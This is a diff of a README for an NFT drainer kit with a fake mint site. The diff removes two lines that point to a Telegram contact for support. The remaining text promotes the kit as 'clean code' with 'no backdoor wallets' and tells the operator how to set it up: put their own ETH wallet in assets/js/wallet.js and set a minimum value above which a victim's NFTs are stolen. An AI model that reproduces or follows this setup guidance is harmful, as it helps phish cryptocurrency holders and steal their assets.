@@ -1,8 +1,6 @@
 # nft-drainer-with-fake-mint
 Powerful NFT Drainer with Fake Mint Site ! No backdoor wallets clean code !
 
-### ⚠️ If you need any help, DM me here: [@SynxUzu](https://t.me/SynxUzu)
-
 ## 🖼️ NFT Stealer / Drainer Template
 
 ![preview](https://cdn.discordapp.com/attachments/1044605595384299544/1050768116357021797/image.png)
@@ -36,7 +34,6 @@ you need to edit the **assets/js/wallet.js** file
 - Edit lines : nftReceiveAddress: "YOUR ETH WALLET", replace YOUR WALLET with your ETH wallet address in assets/js/wallet.js"
 - Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
 
-To get instant support, contact me on my [@SynxUzu](https://t.me/SynxUzu)
 
 # 👻 Why it doesn't show my address?
 
